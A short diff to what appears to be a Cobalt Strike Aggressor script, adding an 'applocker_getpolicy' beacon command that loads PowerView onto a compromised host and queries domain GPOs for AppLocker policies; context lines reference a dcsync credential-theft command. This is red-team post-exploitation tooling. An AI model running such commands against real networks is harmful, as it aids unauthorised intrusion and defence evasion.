@@ -2048,3 +2048,35 @@ beacon_command_register(
     . "Example:\n"
     . "  trust_stealtdocreds dcsync cyberbotic.io b93d2e36-48df-46bf-89d5-2fc22c139b43"
 )
+
+#AppLocker Commands
+##Find Applocker Policy from Domain
+alias applocker_getpolicy {
+    local('$handle $script $oneliner');
+    $size = size(@_);
+    if ($size == 2) {
+        $domain = @_[1];
+        $cmdlet = 'Get-DomainGPO'
+        . ' -Domain ' . $domain
+        . ' | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath';
+        
+        #import the script
+        $handle = openf($POWERVIEW_PATH);
+        $script = readb($handle, -1);
+        closef($handle);
+
+        #send script to beacon
+        $oneliner = beacon_host_script($1, $script);
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bpowerpick($1, $cmdlet, $oneliner);
+}
+beacon_command_register(
+    "applocker_getpolicy",
+    "Check domain Policy for Applocker",
+    "Check domain Policy for Applocker\n\n"
+    . "Usage: applocker_getpolicy [domain]"
+    ."\n"
+)
